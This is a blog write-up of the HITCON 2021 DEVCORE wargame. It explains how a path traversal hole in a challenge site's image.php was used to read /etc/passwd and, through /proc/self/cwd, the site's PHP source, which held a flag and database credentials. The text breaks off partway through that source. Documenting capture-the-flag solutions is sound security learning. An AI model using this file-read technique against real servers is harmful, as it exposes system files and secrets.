<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>HITCON 2021 x DEVCORE Wargame Write-up - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2021/12/01/hitcon2021-devcore-wargame-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2021/12/01/en/hitcon2021-devcore-wargame-writeup/">
    





    <meta name="description" content="HITCON 2021 DEVCORE organized a wargame, which can be found here: https:&#x2F;&#x2F;hackmd.io&#x2F;@d3vc0r3&#x2F;hitcon2021 It was stated that the game can be completed within two hours, so I decided to give it a try. Ho">
<meta property="og:type" content="article">
<meta property="og:title" content="HITCON 2021 x DEVCORE Wargame Write-up">
<meta property="og:url" content="https://blog.huli.tw/2021/12/01/en/hitcon2021-devcore-wargame-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="HITCON 2021 DEVCORE organized a wargame, which can be found here: https:&#x2F;&#x2F;hackmd.io&#x2F;@d3vc0r3&#x2F;hitcon2021 It was stated that the game can be completed within two hours, so I decided to give it a try. Ho">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/hitcon2021-devcore-wargame-writeup/cover-en.png">
<meta property="article:published_time" content="2021-11-30T15:08:40.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.910Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/hitcon2021-devcore-wargame-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="HITCON 2021 x DEVCORE Wargame Write-up" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#solution-notes">1&nbsp;&nbsp;<b>Solution Notes</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#summary">2&nbsp;&nbsp;<b>Summary</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2021/12/01/hitcon2021-devcore-wargame-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            HITCON 2021 x DEVCORE Wargame Write-up
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2021-11-30T15:08:40.000Z" itemprop="datePublished">1 December 2021</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>HITCON 2021 DEVCORE organized a wargame, which can be found here: <a target="_blank" rel="noopener" href="https://hackmd.io/@d3vc0r3/hitcon2021">https://hackmd.io/@d3vc0r3/hitcon2021</a></p>
<p>It was stated that the game can be completed within two hours, so I decided to give it a try. However, due to my lack of experience, I got stuck in one part for a long time. Apart from that, the difficulty level was not high. This article briefly records the process and experience of solving the game.</p>
<span id="more"></span>

<h2><span id="solution-notes">Solution Notes</span></h2><p>Challenge URL (may have been closed): <a target="_blank" rel="noopener" href="http://web.ctf.devcore.tw/">http://web.ctf.devcore.tw/</a></p>
<p>After entering the website, it was obvious that there was a path traversal vulnerability in <code>image.php</code>, which could read any file as long as the path was base64 encoded:</p>
<p><img src="/img/devcore-wargame/p1.jpg"></p>
<p>Let’s read <code>/etc/passwd</code> first:</p>
<pre class="line-numbers language-none"><code class="language-none">123root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
# find PHP source code and you will get the flag.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It was mentioned that the first flag can be obtained as long as the PHP source code is found. I tried some default PHP paths but to no avail. I remembered the <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2021/11/21/balsn-ctf-2021-writeups/">Balsn CTF 2021 WriteUps</a> I read last week, which introduced a magical path <code>file:///proc/self/cwd</code>. So I read <code>/proc/self/cwd/index.php</code> and successfully obtained the contents of <code>index.php</code>!</p>
<p>Continuing to look for other related files based on what the file includes, we can find:</p>
<ol>
<li>error.php</li>
<li>image.php</li>
<li>include.php</li>
<li>index.php</li>
<li>lang.php</li>
<li>order.php</li>
<li>pdf.php</li>
<li>print.php</li>
<li>qrcode.php</li>
<li>rate-limit.php</li>
<li>receipt.php</li>
<li>submit.php</li>
<li>success.php</li>
</ol>
<p>We successfully obtained the first flag in <code>include.php</code>:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
                  _     ___   ___  _  __                
 __   __ __   __ | |   / _ \ / _ \| |/ / __   __ __   __
 \ \ / / \ \ / / | |  | | | | | | | ' /  \ \ / / \ \ / /
  \ V /   \ V /  | |__| |_| | |_| | . \   \ V /   \ V / 
   \_/     \_/   |_____\___/ \___/|_|\_\   \_/     \_/  
                                                        

   DEVCORE&#123;no.1_path_traverse_to_the_m00n&#125;

 */</span>


<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IMAGE_PATH'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/usr/share/nginx/images/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'MYSQL_HOST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'MYSQL_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'web_user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'MYSQL_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'n%6GZgt*hH[+p7vJ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'MYSQL_DATABASE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'web'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ORDER_STATUS_PICKING'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PICKING'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ORDER_STATUS_PACKING'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PACKING'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ORDER_STATUS_SENDING'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'SENDING'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ORDER_STATUS_DELIVERING'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'DELIVERING'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ORDER_STATUS_ARRIVED'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ARRIVED'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ORDER_STATUS_FINISH'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'FINISH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DEFAULT_LANGUAGE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'zh-tw'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ALLOWED_LANGUAGE'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'zh-tw'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">session_start_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">session_start_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">DEFAULT_LANGUAGE</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'langs/'</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'qrcode.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">base64_urlsafe_encode</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'+/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'._'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">base64_urlsafe_decode</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strtr</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'._'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'+/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_pdo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_pdo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_pdo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_pdo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span>
                    <span class="token string single-quoted-string">'mysql:host='</span><span class="token operator">.</span><span class="token constant">MYSQL_HOST</span><span class="token operator">.</span><span class="token string single-quoted-string">';dbname='</span><span class="token operator">.</span><span class="token constant">MYSQL_DATABASE</span><span class="token operator">.</span><span class="token string single-quoted-string">';charset=utf8mb4'</span><span class="token punctuation">,</span>
                    <span class="token constant">MYSQL_USER</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_PASSWORD</span><span class="token punctuation">,</span>
                    <span class="token keyword">array</span><span class="token punctuation">(</span>
                        <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">MYSQL_ATTR_INIT_COMMAND</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'SET NAMES \'utf8mb4\' COLLATE \'utf8mb4_unicode_ci\';'</span><span class="token punctuation">,</span>
                        <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_TIMEOUT</span> <span class="token operator">=></span> <span class="token number">2</span>
                    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_pdo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed to connect database. Please contact the administrtor."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_post_param</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_get_param</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_client_ip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">random_str</span><span class="token punctuation">(</span>
    <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$keyspace</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>RangeException</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Length must be a positive integer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$pieces</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$keyspace</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'8bit'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$pieces</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$keyspace</span><span class="token punctuation">[</span><span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$pieces</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_sig_hash</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token function">get_pdo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1"</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO options VALUES ('sig_secret', '"</span><span class="token operator">.</span><span class="token variable">$secret</span><span class="token operator">.</span><span class="token string double-quoted-string">"'), ('sig_algorithm', 'sha256')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1"</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
